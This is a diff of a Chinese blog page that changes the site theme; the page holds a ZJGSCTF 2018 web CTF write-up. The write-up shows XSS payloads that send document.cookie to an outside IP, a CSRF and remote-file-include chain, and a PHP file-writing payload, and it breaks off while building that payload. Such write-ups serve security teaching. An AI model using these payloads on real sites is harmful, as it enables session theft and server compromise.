@@ -1,21 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-
-    <!--[if lt IE 9]>
-        <style>body {display: none; background: none !important} </style>
-        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
-    <![endif]-->
-
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="format-detection" content="telephone=no" />
-<meta name="author" content="LaLa" />
-
-
-
-<meta name="description" content="— ZJGSCTF 2018 ——  web writeup —">
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="— ZJGSCTF 2018 ——  web writeup —">
 <meta name="keywords" content="writeup,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ZJGSCTF-2018-web writup">
@@ -51,303 +42,144 @@
 <meta name="twitter:title" content="ZJGSCTF-2018-web writup">
 <meta name="twitter:description" content="— ZJGSCTF 2018 ——  web writeup —">
 <meta name="twitter:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fr47td0na2j30vp0eyaaw.jpg">
-
-<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
-
-
-    <link rel="alternate" href="/atom.xml" title="啦啦菌NODE" type="application/atom+xml">
-
-
-
-    <link rel="shortcut icon" href="/favicon.png">
-
-
-
-    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
-
-
-
-    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
-
-
-
-    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
-    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
-
-
-<link rel="stylesheet" href="/css/style.css">
-
-
-
-<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-
-
-<title>ZJGSCTF-2018-web writup | 啦啦菌NODE</title>
-
-<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
-<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
-
-<script>
-    var yiliaConfig = {
-        fancybox: true,
-        animate: true,
-        isHome: false,
-        isPost: true,
-        isArchive: false,
-        isTag: false,
-        isCategory: false,
-        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
-        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
-        search: true
-    }
-</script>
-
-
-    <script> yiliaConfig.jquery_ui = [false]; </script>
-
-
-
-    <script> yiliaConfig.rootUrl = "\/";</script>
-
-
-
-
-
-
-</head>
-<body>
-  <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        <a href="/" class="profilepic">
-            <img src="/img/avatar.png" class="animated zoomIn">
-        </a>
-        <hgroup>
-          <h1 class="header-author"><a href="/">LaLa</a></h1>
-        </hgroup>
-
-        
-
-        
-            <form id="search-form">
-            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
-            <i class="fa fa-times" onclick="resetSearch()"></i>
-            </form>
-            <div id="local-search-result"></div>
-            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
-        
-
-
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                        <div class="icon-wrap icon-me hide" data-idx="3">
-                            <div class="user"></div>
-                            <div class="shoulder"></div>
-                        </div>
-                        
-                    </div>
-                    
-                </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                        <li>关于我</li>
-                        
-                    </ul>
-                </div>
-            </div>
-        
-
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a href="/">主页</a></li>
-                        
-                            <li><a href="/archives/">所有文章</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fa Email" href="/827177488@qq.com" title="Email"></a>
-                            
-                                <a class="fa bilibili" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
-                            
-                                <a class="fa QQ" href="/827177488" title="QQ"></a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day漏洞/">0day漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DAPP/">DAPP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NEO/">NEO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/solidity/">solidity</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能合约/">智能合约</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/比特币/">比特币</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/血泪教训/">血泪教训</a></li></ul>
-                    </div>
-                </section>
-                
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://stella9527.github.io/">9527</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://blog.betamao.me/">betamao_now</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://betamaois.github.io">betamao</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://err0rzz.github.io">壮壮</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://qianfei11.github.io/">feifan</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://esebanana.github.io">ESE</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://hhddj.github.io/">hhd</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://blog.0kami.cn/">0kami</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://b3t4m3ee.github.io/">b3t4m3ee</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">leavesong</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://iamstudy.cnblogs.com/">l3m0n</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="https://myblackmanba.github.io/">MyBlackManba</a>
-                    
-                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
-                    
-                    </div>
-                </section>
-                
-
-                
-                
-                <section class="switch-part switch-part4">
-                
-                    <div id="js-aboutme">biubiubiubiu～&lt;br&gt;动感光波！&lt;br&gt;&lt;br&gt;晚安～</div>
-                </section>
-                
-            </div>
-        </div>
-    </header>                
-</div>
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LaLa</a></h1>
-      </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                <img src="/img/avatar.png" class="animated zoomIn">
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页">LaLa</a></h1>
-            </hgroup>
-            
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a href="/">主页</a></li>
-                
-                    <li><a href="/archives/">所有文章</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fa Email" target="_blank" href="/827177488@qq.com" title="Email"></a>
-                            
-                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
-                            
-                                <a class="fa QQ" target="_blank" href="/827177488" title="QQ"></a>
-                            
-                        </ul>
-            </nav>
-        </header>                
-    </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
-</nav>
-      <div class="body-wrap"><article id="post-ZJGSCTF-2018-writeup" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/05/06/ZJGSCTF-2018-writeup/" class="article-date">
-      <time datetime="2018-05-06T04:39:54.000Z" itemprop="datePublished">2018-05-06</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
         
-  
-    <h1 class="article-title" itemprop="name">
-      ZJGSCTF-2018-web writup
-    </h1>
-  
-
-      </header>
-      
-      <div class="article-info article-info-post">
-        
-
-        
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
-    </div>
-
-        <div class="clearfix"></div>
-      </div>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
           
-        <p>— ZJGSCTF 2018 —<br>—  web writeup —<br><a id="more"></a></p>
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ZJGSCTF-2018-web writup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/05/11/mysql-字符集漏洞/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/04/27/WEB-RPO攻击/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&text=ZJGSCTF-2018-web writup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&is_video=false&description=ZJGSCTF-2018-web writup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ZJGSCTF-2018-web writup&body=Check out this article: http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&name=ZJGSCTF-2018-web writup&description=&lt;p&gt;— ZJGSCTF 2018 —&lt;br&gt;—  web writeup —&lt;br&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#给你的小世界"><span class="toc-number">1.</span> <span class="toc-text">给你的小世界</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工商交友平台"><span class="toc-number">2.</span> <span class="toc-text">工商交友平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#奇淫技巧"><span class="toc-number">3.</span> <span class="toc-text">奇淫技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测-include-On"><span class="toc-number">3.1.</span> <span class="toc-text">猜测 include=On</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测-fopen-On-include-On"><span class="toc-number">3.2.</span> <span class="toc-text">猜测 fopen=On include=On</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小姐姐小姐姐，你听我说噢"><span class="toc-number">4.</span> <span class="toc-text">小姐姐小姐姐，你听我说噢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin-view-php"><span class="toc-number">4.1.</span> <span class="toc-text">admin/view.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-‘SCRIPT-NAME’-漏洞"><span class="toc-number">4.2.</span> <span class="toc-text">$_SERVER[‘SCRIPT_NAME’]漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-number">4.3.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#组合所有漏洞"><span class="toc-number">4.4.</span> <span class="toc-text">组合所有漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造payload"><span class="toc-number">4.5.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于webshell-payload的细节分析"><span class="toc-number">4.6.</span> <span class="toc-text">关于webshell-payload的细节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#view-php的XSS攻击-为何与-include无法结合"><span class="toc-number">4.7.</span> <span class="toc-text">view.php的XSS攻击 为何与 include无法结合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#永恒之蓝"><span class="toc-number">5.</span> <span class="toc-text">永恒之蓝</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#发现"><span class="toc-number">5.1.</span> <span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击"><span class="toc-number">5.2.</span> <span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后言"><span class="toc-number">6.</span> <span class="toc-text">后言</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ZJGSCTF-2018-web writup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">啦啦菌NODE</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-05-06T04:39:54.000Z" itemprop="datePublished">2018-05-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/web/">web</a>, <a class="tag-link" href="/tags/writeup/">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>— ZJGSCTF 2018 —<br>—  web writeup —<br><a id="more"></a></p>
 <h2 id="给你的小世界"><a href="#给你的小世界" class="headerlink" title="给你的小世界"></a>给你的小世界</h2><p>　　好好地弄了下页面，编了个故事，抄了点情书，个人感觉还是挺好滴。</p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr47td0na2j30vp0eyaaw.jpg" alt="1.png"><br></div>
 
 <p>解题的话，很简单，因为只是签到教学题。<br>右键-&gt;base64-&gt;base32-&gt;base16-&gt;flag</p>
-<h2 id="工商交友平台"><a href="#工商交友平台" class="headerlink" title="工商交友平台"></a>工商交友平台</h2><p>其实就是强网杯的Three hit<br>把它页面拔下来，自己后端还原了一下<br>是一个很好的二次注入题目<br>去这里看详细writeup吧 <a href="https://lalajun.github.io/2018/03/26/WEB-网强杯 WEB writeup" target="_blank" rel="external">WEB-网强杯 WEB writeup</a></p>
-<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p><strong>第一关</strong>：MD5弱类型<br>md5(QNKCDZO)=md5(240610708) 0e123=0e456 这样不多说<br><strong>第二关</strong>：让你知道了下php数组a[4]是第五个字符(即a[0]是第一个字符)，直接4就可以成功<br><strong>第三关</strong>：ereg()、strpos()、strlen()<15、$_3>99999999999999999<br>ereg：搜索正则，只要不是单纯的ZJGSCTF都可以的<br>strpos：要找到ZJGSCTF<br>字符串长度小于15<br>值大于9999999999<br>payload:<br><code>100e100ZJGSCTF</code></15、$_3></p>
+<h2 id="工商交友平台"><a href="#工商交友平台" class="headerlink" title="工商交友平台"></a>工商交友平台</h2><p>其实就是强网杯的Three hit<br>把它页面拔下来，自己后端还原了一下<br>是一个很好的二次注入题目<br>去这里看详细writeup吧 <a href="https://lalajun.github.io/2018/03/26/WEB-网强杯 WEB writeup" target="_blank" rel="noopener">WEB-网强杯 WEB writeup</a></p>
+<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p><strong>第一关</strong>：MD5弱类型<br>md5(QNKCDZO)=md5(240610708) 0e123=0e456 这样不多说<br><strong>第二关</strong>：让你知道了下php数组a[4]是第五个字符(即a[0]是第一个字符)，直接4就可以成功<br><strong>第三关</strong>：ereg()、strpos()、strlen()&lt;15、$_3&gt;99999999999999999<br>ereg：搜索正则，只要不是单纯的ZJGSCTF都可以的<br>strpos：要找到ZJGSCTF<br>字符串长度小于15<br>值大于9999999999<br>payload:<br><code>100e100ZJGSCTF</code></p>
 <p><strong>第四关</strong>：file_get_contents 文件读取函数，可以从伪协议中读取<br>猜测服务端的<code>url_allow_fopen</code>与<code>url_allow_include</code>的值</p>
 <h3 id="猜测-include-On"><a href="#猜测-include-On" class="headerlink" title="猜测 include=On"></a>猜测 include=On</h3><p>此时可以使用的伪协议：<br><code>php://input</code>测试可以使用</p>
 <p>但是php://input会从post中读取，肯定读取不到自定义信息，肯定包括php://input自身，不符合题目要求</p>
@@ -369,7 +201,7 @@
 <p>尝试得到XSS<br>payload:<code>&lt;/div&gt; &lt;script&gt;window.location.href=&#39;http://45.63.17.127:12345/cookie.asp?msg=&#39;+document.cookie&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</code></p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorofz8caj30ig058jrp.jpg" alt="wp10.png"><br></div>
 
-<p>失败<br>因为这里服务端<strong>PHP.INI</strong>设置了<code>session.cookie_httponly=On</code><br>如果没有设置的情况<br>换一个payload如下(两个payload效果是一样的)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;/div&gt; &lt;script&gt;var img = document.createElement(&apos;img&apos;);</div><div class="line">img.width = 0;</div><div class="line">img.height = 0;</div><div class="line">img.src = &apos;http://45.63.17.127:12345/a.php?joke=&apos;+document.cookie;&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>失败<br>因为这里服务端<strong>PHP.INI</strong>设置了<code>session.cookie_httponly=On</code><br>如果没有设置的情况<br>换一个payload如下(两个payload效果是一样的)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;/div&gt; &lt;script&gt;var img = document.createElement(&apos;img&apos;);</span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line">img.src = &apos;http://45.63.17.127:12345/a.php?joke=&apos;+document.cookie;&lt;/script&gt; &lt;div class=&quot;panel-body&quot;&gt;</span><br></pre></td></tr></table></figure></p>
 <div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqorov86w6j30if05mq3d.jpg" alt="wp11.png"><br></div>
 
 <p>至此我们可以发现提交意见框存在XSS漏洞，也就是我们可以在admin用户的网页内执行任意前端代码，包括让admin用户去访问我们制定的网站，除了无法获得用户的cookie。</p>
@@ -386,7 +218,7 @@
 <p>进行测试</p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fqorpo4b79j30ga09j3ym.jpg" alt="wp2.png"><br></div>
 
-<p>发现成功对返回的页面进行修改，尝试是否可以进一步利用。<br>payload:<code>&quot;&gt; &lt;/a&gt; 1 &lt;a  href=&quot;</code><br>形成以下构造<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//index.php "</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> 1 <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-default"</span>&gt;</span>Current Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>发现成功对返回的页面进行修改，尝试是否可以进一步利用。<br>payload:<code>&quot;&gt; &lt;/a&gt; 1 &lt;a  href=&quot;</code><br>形成以下构造<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//index.php "</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> 1 <span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-default"</span>&gt;</span>Current Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqorq32nyrj30ko05iglp.jpg" alt="wp3.png"><br></div>
 
 <p>payload:<code>&quot;&gt; &lt;/a&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;a  href= /</code></p>
@@ -409,15 +241,15 @@
 <blockquote>
 <p>ps.之前在hackbar中的数据实际上在发送前会被URL加密一次。<br>经过hackbar发送的请求，自动URL加密GET参数，不自动URL加密POST参数</p>
 </blockquote>
-<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><code>/admin/index.php</code> 有一处显而易见的远程文件包含<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span> <span class="string">"http://localhost/"</span>.$_GET[<span class="string">'path'</span>];</div></pre></td></tr></table></figure></p>
-<p>此处<strong>include</strong>会执行一次访问 “<a href="http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果" target="_blank" rel="external">http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果</a> 中的PHP代码<br>而在访问本地地址的时候会再解析一次，也就是这句话会把path指定的页面解析两次。<br>无法理解的话，请参考<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="external">lfi与rfi</a></p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><code>/admin/index.php</code> 有一处显而易见的远程文件包含<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"http://localhost/"</span>.$_GET[<span class="string">'path'</span>];</span><br></pre></td></tr></table></figure></p>
+<p>此处<strong>include</strong>会执行一次访问 “<a href="http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果" target="_blank" rel="noopener">http://localhost/&quot;.$_GET[&#39;path&#39;]的返回结果</a> 中的PHP代码<br>而在访问本地地址的时候会再解析一次，也就是这句话会把path指定的页面解析两次。<br>无法理解的话，请参考<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">lfi与rfi</a></p>
 <p>但是由于之前有<code>check()</code>验证cookie。而我们不是admin用户，没法利用</p>
 <p>同时这个页面，admin访问的话没有阻碍，即存在CSRF。</p>
 <h3 id="组合所有漏洞"><a href="#组合所有漏洞" class="headerlink" title="组合所有漏洞"></a>组合所有漏洞</h3><p>我们知道可以通过联系admin用户的输入框控制admin界面的前端页面，此处可以嵌入<code>&lt;img src= /&gt;</code>让admin用户自动访问任意网站，形成csrf<br>我们知道可以通过<code>/admin/index.php</code>的本地文件包含，包含执行对方服务器本地存在的代码。<br>我们知道可以在<code>index.php</code>中嵌入任意php代码</p>
 <p>于是一套COMBO就连成了。<br>通过<strong>输入框</strong>控制admin用户去访问<strong>/admin/index.php</strong>。在其<code>参数path</code>中让<strong>include包含</strong>被我们注入php代码的漏洞页面<strong>index.php/xxxxx</strong></p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>由于我们需要看到php执行的结果，把结果写入test.php文件夹中。<br>构造php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">fwrite(fopen(<span class="string">'test.php'</span>,<span class="string">'w+'</span>),<span class="string">"&lt;?php var_dump(glob('*'));?&gt;"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
